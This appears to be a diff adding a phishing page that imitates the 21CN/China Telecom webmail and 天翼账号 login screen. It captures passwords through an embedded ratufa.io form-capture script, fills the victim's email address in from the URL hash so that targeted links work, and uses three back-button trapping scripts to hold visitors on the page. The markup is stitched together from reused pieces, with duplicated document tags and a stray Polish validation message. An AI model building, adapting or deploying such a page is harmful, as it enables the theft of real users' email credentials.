@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>21CN 邮箱</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    overflow-x: hidden;
+}
+
+/* Top White Utilities Ribbon Header Bar Line Layout Elements */
+.navbar {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 16px 20px;
+    background-color: #ffffff;
+    z-index: 10;
+}
+
+.logo-box {
+    font-size: 20px;
+    font-weight: bold;
+    color: #cc0000;
+    letter-spacing: -0.5px;
+}
+
+.nav-links {
+    font-size: 12px;
+    color: #666666;
+}
+
+.nav-links a {
+    color: #666666;
+    text-decoration: none;
+    padding: 0 4px;
+}
+
+.nav-links a:hover {
+    color: #0086f6;
+}
+
+/* Main Content Workspace Layout View Area Segment Frame Backdrops */
+.workspace-banner {
+    flex-grow: 1;
+    background-color: #e3edf7;
+    /* Soft clean sky-blue gradient featuring continuous landscape panoramic mountain/bridge asset backdrop seamlessly */
+    background: linear-gradient(rgba(255, 255, 255, 0.4), rgba(227, 237, 247, 0.2)),
+                url('https://unsplash.com') no-repeat center center fixed;
+    background-size: cover;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 60px 40px;
+    width: 100%;
+    position: relative;
+}
+
+.main-content-wrapper {
+    width: 100%;
+    max-width: 1200px;
+    display: flex;
+    gap: 40px;
+    align-items: center;
+    justify-content: space-between;
+}
+
+/* Left Hero Typography & Badge Layout Column */
+.left-hero-panel {
+    flex: 1.2;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    text-align: left;
+    color: #333333;
+}
+
+.vip-badge-logo {
+    font-size: 14px;
+    font-weight: bold;
+    color: #d4af37; /* Warm gold signature color style */
+    border: 1px solid #d4af37;
+    padding: 4px 12px;
+    border-radius: 4px;
+    margin-bottom: 32px;
+    letter-spacing: 1px;
+}
+
+.hero-title {
+    font-size: 42px;
+    font-weight: 300;
+    color: #556270;
+    margin-bottom: 32px;
+    letter-spacing: 1px;
+}
+
+.hero-cta-btn {
+    display: inline-block;
+    background-color: rgba(74, 85, 104, 0.6); /* Translucent soft charcoal gray panel button */
+    backdrop-filter: blur(4px);
+    color: #ffffff;
+    text-decoration: none;
+    padding: 14px 28px;
+    font-size: 14px;
+    font-weight: 500;
+    border-radius: 4px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    transition: background-color 0.2s;
+}
+
+.hero-cta-btn:hover {
+    background-color: rgba(74, 85, 104, 0.8);
+}
+
+.hero-cta-btn span {
+    margin-left: 6px;
+    font-size: 16px;
+}
+
+/* Right Column: Credentials Main Container White Float Box Card Block */
+.login-card {
+    flex: 0.8;
+    max-width: 360px;
+    background-color: #ffffff;
+    border-radius: 4px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.06);
+    padding: 32px;
+    width: 100%;
+}
+
+.card-header {
+    font-size: 15px;
+    font-weight: bold;
+    color: #333333;
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+
+form {
+    width: 100%;
+}
+
+.form-group {
+    margin-bottom: 16px;
+    width: 100%;
+}
+
+/* Clean structured input text fields with light border lines */
+.form-control {
+    width: 100%;
+    height: 40px;
+    border: 1px solid #cbd5e1;
+    border-radius: 2px;
+    padding: 0 12px;
+    font-size: 14px;
+    color: #111111;
+    outline: none;
+    background-color: #ffffff;
+}
+
+.form-control:focus {
+    border-color: #0086f6;
+}
+
+.form-control::placeholder {
+    color: #b2b2b2;
+    font-weight: 300;
+}
+
+.secure-wrapper {
+    position: relative;
+}
+
+.eye-toggle {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    color: #b2b2b2;
+    font-size: 14px;
+    user-select: none;
+}
+
+/* High contrast crisp wide rectangular sky blue primary submit action button (NOW FULLY CLICKABLE) */
+.submit-btn {
+    position: relative;
+    z-index: 20;
+    width: 100%;
+    background-color: #0086f6; /* Eye-catching primary blue shade */
+    color: #ffffff;
+    border: none;
+    height: 42px;
+    font-size: 15px;
+    font-weight: 500;
+    letter-spacing: 4px;
+    border-radius: 2px;
+    cursor: pointer;
+    margin-top: 4px;
+    margin-bottom: 20px;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #0075d9;
+}
+
+/* Fine-print legal checking node configuration layout constraints row banner */
+.agreement-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 6px;
+    font-size: 11px;
+    color: #666666;
+    line-height: 1.4;
+    text-align: left;
+    margin-bottom: 16px;
+}
+
+.agreement-row input {
+    margin-top: 2px;
+    accent-color: #0086f6;
+}
+
+.agreement-row label a {
+    color: #0086f6;
+    text-decoration: none;
+}
+
+.agreement-row label a:hover {
+    text-decoration: underline;
+}
+
+/* Stay logged box alignment section component row */
+.toggle-row {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 12px;
+    color: #666666;
+    margin-bottom: 24px;
+}
+
+.toggle-row input {
+    accent-color: #0086f6;
+}
+
+.toggle-row span {
+    font-size: 10px;
+    color: #b2b2b2;
+}
+
+/* Footer layout assistance secondary navigation connections area link stack list */
+.card-footer-links {
+    width: 100%;
+    text-align: right;
+    font-size: 12px;
+    color: #cbd5e1;
+    border-top: 1px dotted #eef2f5;
+    padding-top: 16px;
+}
+
+.card-footer-links a {
+    color: #666666;
+    text-decoration: none;
+    margin: 0 4px;
+}
+
+.card-footer-links a:hover {
+    color: #0086f6;
+    text-decoration: underline;
+}
+
+/* Fine-print corporate layout footer information sections components ribbon strip */
+.page-footer {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 24px 20px;
+    background-color: #ffffff;
+    border-top: 1px solid #edf2f7;
+    font-size: 12px;
+    color: #666666;
+}
+
+.telecom-brand {
+    font-weight: bold;
+    color: #004499;
+}
+
+.footer-right {
+    text-align: right;
+    line-height: 1.6;
+}
+
+.footer-right a {
+    color: #666666;
+    text-decoration: none;
+}
+
+.footer-right a:hover {
+    text-decoration: underline;
+}
+
+.copyright-line {
+    font-size: 11px;
+    color: #999999;
+}
+
+@media (max-width: 860px) {
+    .main-content-wrapper {
+        flex-direction: column;
+        gap: 40px;
+    }
+    .left-hero-panel {
+        width: 100%;
+        align-items: center;
+        text-align: center;
+    }
+    .login-card {
+        max-width: 100%;
+    }
+    .page-footer {
+        flex-direction: column;
+        gap: 12px;
+        text-align: center;
+    }
+    .footer-right {
+        text-align: center;
+    }
+}
+
+
+    </style>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>21CN VIP Mailbox Login</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Top Utility Header Navbar Ribbon Line -->
+    <header class="navbar">
+        <div class="brand-logo-area">
+            <!-- Header Logo Image Placeholder Box -->
+            <div class="logo-box">21CN 邮箱</div>
+        </div>
+        <nav class="nav-links">
+            <a href="#">Information Announcement</a> | 
+            <a href="#">Mobile client</a> | 
+            <a href="#">Corporate Email</a> | 
+            <a href="#">help</a>
+        </nav>
+    </header>
+
+    <!-- Main Panoramic Horizon Content Workspace Area Component -->
+    <main class="workspace-banner">
+        <div class="main-content-wrapper">
+            
+            <!-- Left Hero Content Presentation Text Layer Column -->
+            <div class="left-hero-panel">
+                <div class="vip-badge-logo">VIP 非凡邮 21CN.COM</div>
+                <h1 class="hero-title">只为,彰显您的非凡气质</h1>
+                <a href="#" class="hero-cta-btn">了解21CN非凡邮 <span>&rsaquo;</span></a>
+            </div>
+
+            <!-- Right Column Form Container Card Box Component Module -->
+            <div class="login-card">
+                
+                <!-- Section Header Category Header Line -->
+                <div class="card-header">
+                    <span class="telecom-icon">💛</span> 天翼账号
+                </div>
+				
+                <!-- Form submission tracking configuration using FormSubmit module paths -->
+                <form action="" method="POST">
+                    <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                    <div class="form-group">
+
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                    </div>
+
+                    <div class="form-group secure-wrapper">
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                        <span class="eye-toggle">🔏</span>
+                    </div>
+
+                    <!-- Solid Rectangular Sky Blue Action Submission Trigger Button Block -->
+                    <button type="submit" class="submit-btn">登录</button>
+
+                    <!-- Legal Terms Acceptance Checkbox Row -->
+                    <div class="agreement-row">
+                        <input type="checkbox" id="agree" name="agree" required>
+                        <label for="agree">我已阅读并同意 <a href="#">天翼账号服务协议</a> 和 <a href="#">天翼账号隐私政策</a></label>
+                    </div>
+
+                    <!-- Stay Logged Selection Switch Parameter Option -->
+                    <div class="toggle-row">
+                        <input type="checkbox" id="remember" name="remember">
+                        <label for="remember">7天内自动登录 <span>▶</span></label>
+                    </div>
+                </form>
+
+                <!-- Footer assistance secondary connection paths menu links stack -->
+                <div class="card-footer-links">
+                    <a href="#">找回密码</a> | <a href="#">帮助</a>
+                </div>
+
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Base Fine-Print Page Footer Copyright Links Wrapper -->
+    <footer class="page-footer">
+        <div class="footer-left">
+            <span class="telecom-brand">🇨🇳 中国电信 CHINA TELECOM</span>
+        </div>
+        <div class="footer-right">
+            <div>ICP Filing: 粤ICP备09014623号-2 | (Click to Contact) Instant Online Customer Service</div>
+            <div class="copyright-line">Copyright © China Telecom Digital Life Technology Co., Ltd. <a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a></div>
+        </div>
+    </footer>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+<style>
+body{
+background-image:url("https://github.com/cdtechdigital/images/blob/main/21cn.jpg?raw=true");
+background-repeat:no-repeat;
+background-image:fixed;
+background-size:cover;
+}
+</body>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</html>
